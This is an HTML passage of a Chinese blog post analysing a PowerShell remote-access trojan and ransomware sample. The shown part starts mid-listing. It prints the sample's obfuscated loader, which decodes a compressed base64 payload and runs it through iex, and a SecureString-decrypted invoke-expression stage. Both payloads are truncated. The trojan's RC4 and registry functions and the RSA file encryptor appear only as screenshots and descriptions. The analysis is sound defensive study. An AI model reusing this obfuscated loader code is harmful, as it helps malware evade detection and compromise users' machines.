class="string">&#x27;siOn.cOMp&#x27;</span>,<span class="string">&#x27;.COMprE&#x27;</span>,<span class="string">&#x27;On&#x27;</span>,<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;reS&#x27;</span>,<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;t&#x27;</span>));</span><br><span class="line">&amp;(<span class="string">&quot;&#123;2&#125;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;-ITE&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;sEt&#x27;</span>)  (<span class="string">&#x27;va&#x27;</span>+<span class="string">&#x27;Ri&#x27;</span>+<span class="string">&#x27;a&#x27;</span>+<span class="string">&#x27;blE:0bT&#x27;</span>) ([<span class="type">TYpe</span>](<span class="string">&quot;&#123;2&#125;&#123;3&#125;&#123;1&#125;&#123;4&#125;&#123;0&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;oDInG&#x27;</span>,<span class="string">&#x27;T.E&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;ysTem.TEx&#x27;</span>,<span class="string">&#x27;nC&#x27;</span>)); </span><br><span class="line">(&amp;(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&#123;2&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;nEW-obj&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;Ct&#x27;</span>)  (<span class="string">&quot;&#123;5&#125;&#123;1&#125;&#123;0&#125;&#123;2&#125;&#123;4&#125;&#123;3&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;o.&#x27;</span>,<span class="string">&#x27;Ystem.i&#x27;</span>,<span class="string">&#x27;coMPrESS&#x27;</span>,<span class="string">&#x27;on.DEFLatEStreaM&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;s&#x27;</span>)( [<span class="type">IO.memoRYstREam</span>](&amp;(<span class="string">&quot;&#123;1&#125;&#123;2&#125;&#123;3&#125;&#123;0&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;BlE&#x27;</span>,<span class="string">&#x27;GeT-&#x27;</span>,<span class="string">&#x27;V&#x27;</span>,<span class="string">&#x27;AriA&#x27;</span>) (<span class="string">&quot;&#123;0&#125;&#123;2&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;H6&#x27;</span>,<span class="string">&#x27;Kl2&#x27;</span>,<span class="string">&#x27;j&#x27;</span>)  <span class="literal">-VAL</span>)::(<span class="string">&quot;&#123;3&#125;&#123;2&#125;&#123;0&#125;&#123;1&#125;&#123;4&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;BasE&#x27;</span>,<span class="string">&#x27;64&#x27;</span>,<span class="string">&#x27;OM&#x27;</span>,<span class="string">&#x27;fr&#x27;</span>,<span class="string">&#x27;stRING&#x27;</span>).Invoke( (<span class="string">&quot;&#123;113&#125;&#123;20&#125;&#123;73&#125;&#123;11&#125;&#123;64&#125;&#123;110&#125;&#123;2&#125;&#123;58&#125;&#123;3&#125;&#123;93&#125;&#123;90&#125;&#123;43&#125;&#123;109&#125;&#123;98&#125;&#123;107&#125;&#123;32&#125;&#123;6&#125;&#123;74&#125;&#123;111&#125;&#123;34&#125;&#123;56&#125;&#123;66&#125;&#123;47&#125;&#123;37&#125;&#123;27&#125;&#123;75&#125;&#123;102&#125;&#123;5&#125;&#123;99&#125;&#123;23&#125;&#123;55&#125;&#123;86&#125;&#123;60&#125;&#123;41&#125;&#123;83&#125;&#123;94&#125;&#123;97&#125;&#123;53&#125;&#123;84&#125;&#123;59&#125;&#123;48&#125;&#123;63&#125;&#123;31&#125;&#123;89&#125;&#123;22&#125;&#123;45&#125;&#123;101&#125;&#123;104&#125;&#123;81&#125;&#123;105&#125;&#123;42&#125;&#123;19&#125;&#123;85&#125;&#123;33&#125;&#123;52&#125;&#123;54&#125;&#123;51&#125;&#123;24&#125;&#123;4&#125;&#123;65&#125;&#123;16&#125;&#123;17&#125;&#123;114&#125;&#123;87&#125;&#123;44&#125;&#123;0&#125;&#123;10&#125;&#123;50&#125;&#123;95&#125;&#123;67&#125;&#123;100&#125;&#123;14&#125;&#123;106&#125;&#123;78&#125;&#123;92&#125;&#123;21&#125;&#123;68&#125;&#123;7&#125;&#123;25&#125;&#123;79&#125;&#123;77&#125;&#123;82&#125;&#123;26&#125;&#123;49&#125;&#123;35&#125;&#123;69&#125;&#123;96&#125;&#123;18&#125;&#123;15&#125;&#123;62&#125;&#123;39&#125;&#123;88&#125;&#123;80&#125;&#123;70&#125;&#123;1&#125;&#123;76&#125;&#123;108&#125;&#123;115&#125;&#123;36&#125;&#123;71&#125;&#123;46&#125;&#123;40&#125;&#123;72&#125;&#123;112&#125;&#123;30&#125;&#123;9&#125;&#123;13&#125;&#123;29&#125;&#123;8&#125;&#123;28&#125;&#123;61&#125;&#123;91&#125;&#123;103&#125;&#123;57&#125;&#123;38&#125;&#123;12&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;gGr9FfdarP0/l9gj9RD6EuU/35Qg+9fJx5TvpV9ZWqG/L5dt4z73auPsN79IftfDWX8xleg56N9j7Ohc/SY9Q/N9V/PKEXWQd1Sg0XUa/gnn52DgFXS2+WfJi6Hf3+/J7hYfSpDcGH/o+rc1lqHNu26C/5AR8gwoSChqRQg4bUpWESQ1vYX38izh5jLlGtintPVSbY0t5rzeeZ9+gH3z/3LbhPF5/Go/bnd+7BId93e+6W6F+838VPVt5j+ZshObZ8b118e+rZzL02H/253pPX8HJDF50l/rF23kzx26l/zXvxzTwvDnvkezjUXCx+yV7bo2e52Ctr7uhrPr/kgYir+pzCs4x/cuGXLnmAs3hu9hBzY5/5ef+hu1H/ZM6Wn8uD+xodZbfL4yHnOX5Qcrwu9Ej09jeZx25/nzkQb+w1vufV*****省略&#x27;</span>) ),  (&amp;(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;Di&#x27;</span>,<span class="string">&#x27;R&#x27;</span>)  (<span class="string">&quot;&#123;3&#125;&#123;2&#125;&#123;4&#125;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;E:&#x27;</span>,<span class="string">&#x27;6D0v&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;VAR&#x27;</span>,<span class="string">&#x27;aBL&#x27;</span>) ).<span class="string">&quot;VaL`Ue&quot;</span>::<span class="string">&quot;deco`Mp`REss&quot;</span> ) |&amp;(<span class="string">&quot;&#123;1&#125;&#123;0&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;OREaCH&#x27;</span>,<span class="string">&#x27;F&#x27;</span>) &#123; &amp;(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&#123;2&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;nEW&#x27;</span>,<span class="string">&#x27;-o&#x27;</span>,<span class="string">&#x27;bjECt&#x27;</span>) (<span class="string">&quot;&#123;4&#125;&#123;0&#125;&#123;1&#125;&#123;2&#125;&#123;3&#125;&#123;5&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;ys&#x27;</span>,<span class="string">&#x27;tEM.iO.STReaMR&#x27;</span>,<span class="string">&#x27;eA&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;Er&#x27;</span>)(<span class="variable">$</span>&#123;_&#125;, (  &amp;(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;CI&#x27;</span>) (<span class="string">&#x27;va&#x27;</span>+<span class="string">&#x27;Ri&#x27;</span>+<span class="string">&#x27;A&#x27;</span>+<span class="string">&#x27;BLe:0bT&#x27;</span>)).<span class="string">&quot;vAl`Ue&quot;</span>::<span class="string">&quot;aS`cii&quot;</span>) &#125; ).(<span class="string">&quot;&#123;1&#125;&#123;2&#125;&#123;0&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;END&#x27;</span>,<span class="string">&#x27;Re&#x27;</span>,<span class="string">&#x27;adTO&#x27;</span>).Invoke()|&amp;<span class="built_in">iex</span></span><br></pre></td></tr></table></figure>
<ul>
<li>在ps调试命令行中输出解密后的数据如下，使用安全字符串对硬编码的字符串进行解密，使用invoke-expression执行</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">invoke-expression( </span><br><span class="line">(new-object  management.automation.pscredential &#x27;&#x27;,</span><br><span class="line">(&#x27;76492d1116743f0423413b16050a5345MgB8AGMAawBIAHkASQBmAFcANQBvAEIAVgBYAHUAbwB0AHEATwBjAFIANQAvAFEAPQA9AHwAZQA5AGEAMwBiADQANAA2ADkAYQAyAGYANgBhADEAOQA0ADcANQAzAGUAMABmADQAMwAyADYAZABjAGMAZABkADAAMQA0ADgAMQAwAGEAZgA1ADcAOQBkADEAYwBiADUAMgA3ADgAOAA1ADYAZQAyADIANgBlAGIANwBiAGQAZAA5ADAAYwA3ADEAMwA4ADEAOQBkADYAYwBlADEAZQAwADYAMwBlADEAMwBiAGEANQAyAGYANQA1AGIAMwBjAGMAOQA1ADkAMwBmADQAYwAwAGYAMQAwADEAYgAxADQAMQA2AGMAZQA4ADAAOAA4ADYANQAxAGUA***省略&#x27;|cOnvERTtO-SecUReStRiNG -key  (200..177))</span><br><span class="line">).getnetworkcredential().password)</span><br></pre></td></tr></table></figure>
<ul>
<li>再次解密，获取到了其核心的程序，下面详细分析其执行流程和功能。</li>
</ul>
<p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200715120039779.png" alt="image-20200715120039779"></p>
<ul>
<li>因为程序中使用了大量的字符串替换操作来提升分析难度,这里简单分析其核心功能，发现其通过主循环来实现命令接受及数据反回</li>
</ul>
<p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201122234404582.png" alt="image-20201122234404582"></p>
<ul>
<li>其程序中采用RC4加解密数据</li>
</ul>
<p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201122234448885.png" alt="image-20201122234448885"></p>
<ul>
<li>注册表修改</li>
</ul>
<p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201122234526079.png" alt="image-20201122234526079"></p>
<ul>
<li>通过分析该程序为一个标准的远控木马，但是从目前获取的信息无法判断其是哪个家族及框架，但该木马的主要特征是利用powershell进行所有的操作，由于powershell的强大，这对用户的影响是巨大的。</li>
</ul>
<h4 id="加密程序分析"><a href="#加密程序分析" class="headerlink" title="加密程序分析"></a>加密程序分析</h4><ul>
<li>lock.php的文件内容似乎是一个C#源代码，通过阅读其源代码发现其具有文件加密的能力，代码如下:</li>
</ul>
<p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201122234945593.png" alt="image-20201122234945593"></p>
<ul>
<li>使用RSA算法生成密钥</li>
</ul>
<p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201122235008525.png" alt="image-20201122235008525"></p>
<ul>
<li>加密目录和后缀</li>
</ul>
<p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201122235056382.png" alt="image-20201122235056382"></p>
<p>======持续更新</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Richardo.M</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://richard447.github.io/2020/07/20/%E4%B8%80%E4%B8%AA%E5%A4%9A%E5%B1%82%E5%8A%A0%E5%AF%86%E6%B7%B7%E6%B7%86%E7%9A%84powershell%E6%9C%A8%E9%A9%AC&amp;%E5%8B%92%E7%B4%A2%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/">https://richard447.github.io/2020/07/20/%E4%B8%80%E4%B8%AA%E5%A4%9A%E5%B1%82%E5%8A%A0%E5%AF%86%E6%B7%B7%E6%B7%86%E7%9A%84powershell%E6%9C%A8%E9%A9%AC&amp;%E5%8B%92%E7%B4%A2%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://richard447.github.io" target="_blank">Richardo</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/">勒索病毒</a></div><div class="post_share"><div class="social-share" data-image="https://overwatch.nosdn.127.net/2/media/screenshots/brigitte-screenshot-01_n2d31.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/10/29/Emotet%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"><img class="prev-cover" src="https://overwatch.nosdn.127.net/a/images/2021/1/13/70dadcf36262b15cb803223ed56ad252.jpeg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Emotet病毒分析</div></div></a></div><div class="next-post pull-right"><a href="/2020/03/20/DroidBox%E9%85%8D%E7%BD%AE/"><img class="next-cover" src="https://overwatch.nosdn.127.net/2/media/screenshots/hanamura-screenshot-010.16TUs.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">DroidBox配置</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/self_icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">Richardo.M</div><div class="author-info__description">心有猛虎，细嗅蔷薇</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/richard447"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">We1C0me_t0_Richard0's W0rld</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#powershell%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92"><span class="toc-number">1.</span> <span class="toc-text">powershell勒索病毒</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.0.0.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%B7%E6%9C%AC%E5%9F%BA%E7%A1%80%E4%BF%A1%E6%81%AF"><span class="toc-number">1.0.0.2.</span> <span class="toc-text">样本基础信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90"><span class="toc-number">1.0.0.3.</span> <span class="toc-text">详细分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A9%BB%E7%95%99%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"><span class="toc-number">1.0.0.4.</span> <span class="toc-text">驻留程序分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A0%E5%AF%86%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"><span class="toc-number">1.0.0.5.</span> <span class="toc-text">加密程序分析</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2020/12/27/CVE-2020-1380%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%8F%8AEXP%E6%9E%84%E9%80%A0/" title="CVE-2020-1380漏洞利用及EXP构造"><img src="https://overwatch.nosdn.127.net/2/media/screenshots/ayutthaya-screenshot-001.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CVE-2020-1380漏洞利用及EXP构造"/></a><div class="content"><a class="title" href="/2020/12/27/CVE-2020-1380%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%8F%8AEXP%E6%9E%84%E9%80%A0/" title="CVE-2020-1380漏洞利用及EXP构造">CVE-2020-1380漏洞利用及EXP构造</a><time datetime="2020-12-26T16:00:00.000Z" title="发表于 2020-12-27 00:00:00">2020-12-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/12/25/IE%E4%B8%ADJscript9%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%93%E6%9E%84%E7%A0%94%E7%A9%B6/" title="IEJscript9中的一些数据对象研究"><img src="https://overwatch.nosdn.127.net/2/media/screenshots/rialto-screenshot-004.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="IEJscript9中的一些数据对象研究"/></a><div class="content"><a class="title" href="/2020/12/25/IE%E4%B8%ADJscript9%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%93%E6%9E%84%E7%A0%94%E7%A9%B6/" title="IEJscript9中的一些数据对象研究">IEJscript9中的一些数据对象研究</a><time datetime="2020-12-24T16:00:00.000Z" title="发表于 2020-12-25 00:00:00">2020-12-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/10/29/Emotet%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/" title="Emotet病毒分析"><img src="https://overwatch.nosdn.127.net/a/images/2021/1/13/70dadcf36262b15cb803223ed56ad252.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Emotet病毒分析"/></a><div class="content"><a class="title" href="/2020/10/29/Emotet%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/" title="Emotet病毒分析">Emotet病毒分析</a><time datetime="2020-10-28T16:00:00.000Z" title="发表于 2020-10-29 00:00:00">2020-10-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/07/20/%E4%B8%80%E4%B8%AA%E5%A4%9A%E5%B1%82%E5%8A%A0%E5%AF%86%E6%B7%B7%E6%B7%86%E7%9A%84powershell%E6%9C%A8%E9%A9%AC&amp;%E5%8B%92%E7%B4%A2%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/" title="Powershell勒索病毒"><img src="https://overwatch.nosdn.127.net/2/media/screenshots/brigitte-screenshot-01_n2d31.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Powershell勒索病毒"/></a><div class="content"><a class="title" href="/2020/07/20/%E4%B8%80%E4%B8%AA%E5%A4%9A%E5%B1%82%E5%8A%A0%E5%AF%86%E6%B7%B7%E6%B7%86%E7%9A%84powershell%E6%9C%A8%E9%A9%AC&amp;%E5%8B%92%E7%B4%A2%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/" title="Powershell勒索病毒">Powershell勒索病毒</a><time datetime="2020-07-19T16:00:00.000Z" title="发表于 2020-07-20 00:00:00">2020-07-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/03/20/DroidBox%E9%85%8D%E7%BD%AE/" title="DroidBox配置"><img src="https://overwatch.nosdn.127.net/2/media/screenshots/hanamura-screenshot-010.16TUs.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DroidBox配置"/></a><div class="content"><a class="title" href="/2020/03/20/DroidBox%E9%85%8D%E7%BD%AE/" title="DroidBox配置">DroidBox配置</a><time datetime="2020-03-19T16:00:00.000Z" title="发表于 2020-03-20 00:00:00">2020-03-20</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By Richardo.M</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>